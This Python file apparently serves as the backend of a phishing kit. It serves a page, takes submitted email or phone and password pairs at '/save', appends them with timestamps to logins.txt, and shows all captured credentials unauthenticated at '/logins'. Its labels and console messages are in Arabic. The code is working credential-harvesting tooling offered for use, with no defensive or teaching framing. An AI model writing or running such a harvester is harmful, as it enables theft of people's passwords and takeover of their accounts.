from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class SaveHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/save':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            with open('logins.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
                f.write(f"البريد/الهاتف: {data.get('email', 'غير معروف')} | ")
                f.write(f"كلمة المرور: {data.get('password', 'غير معروف')}\n")
                f.write("-" * 60 + "\n")
            
            print(f"✅ تم تسجيل: {data.get('email', 'غير معروف')}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

    def do_GET(self):
        if self.path == '/':
            try:
                with open('index.html', 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(f.read())
            except:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 - Page not found')
        elif self.path == '/logins':
            try:
                with open('logins.txt', 'r', encoding='utf-8') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(content.encode('utf-8'))
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'No logins found')

server = HTTPServer(('0.0.0.0', 8080), SaveHandler)
print("=" * 50)
print("✅ Server running on http://localhost:8080")
print("📁 Data saved in logins.txt")
print("🌐 View logins: http://localhost:8080/logins")
print("=" * 50)
server.serve_forever()
